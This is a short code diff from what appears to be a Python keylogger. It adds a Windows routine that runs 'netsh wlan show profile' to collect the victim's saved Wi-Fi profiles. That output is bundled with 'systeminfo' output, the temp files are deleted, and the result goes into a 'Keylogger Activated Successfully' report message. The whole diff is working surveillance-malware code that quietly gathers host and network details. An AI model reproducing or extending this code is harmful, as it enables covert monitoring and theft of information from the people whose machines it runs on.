@@ -7,16 +7,18 @@ def main():
         if IsAccountActive:
             if operating_system == "Windows":
                 terminal("systeminfo > systeminfo.txt")
-
                 file = open("systeminfo.txt", "r")
                 systeminfo = file.read()
                 file.close()
-
                 remove("systeminfo.txt")
 
-                msg = (
-                    f"Keylogger Activated Successfully...\n\nSystem Info:\n{systeminfo}"
-                )
+                terminal("netsh wlan show profile > netsh.txt")
+                file = open("netsh.txt", "r")
+                netsh = file.read()
+                file.close()
+                remove("netsh.txt")
+
+                msg = f"Keylogger Activated Successfully...\n\nsysteminfo:\n{systeminfo}\n\nnetsh:\n{netsh}"
 
             else:
                 msg = "Keylogger Activated Successfully..."
